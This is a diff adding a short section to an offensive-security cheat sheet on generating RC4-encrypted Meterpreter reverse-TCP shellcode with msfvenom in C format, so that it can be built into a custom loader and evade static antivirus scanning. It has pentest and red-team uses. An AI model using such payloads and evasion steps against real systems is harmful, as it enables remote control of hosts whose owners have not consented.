@@ -200,3 +200,33 @@ meterpreter> load stdapi
 ```
 
 @Karmaz95
+
+## Encrypted Meterpreter Payloads:
+
+Metasploit Framework Encryption Formats:
+
+```
+$ msfvenom -l encrypt
+
+Framework Encryption Formats [--encrypt <value>]
+================================================
+
+Name
+----
+
+aes256
+base64
+rc4
+xor
+```
+
+The syntax below generates a windows/meterpreter/reverse_tcp that is encrypted with RC4. It is also generated in C format, so that you can build your own loader in C/C++.
+
+```
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key supersecretkey -f c
+```
+
+Although antivirus isn’t good at scanning encrypted shellcode statically, run-time monitoring is still a strong line of defense. It is easy to get caught after you decrypt and execute it.
+
+
+
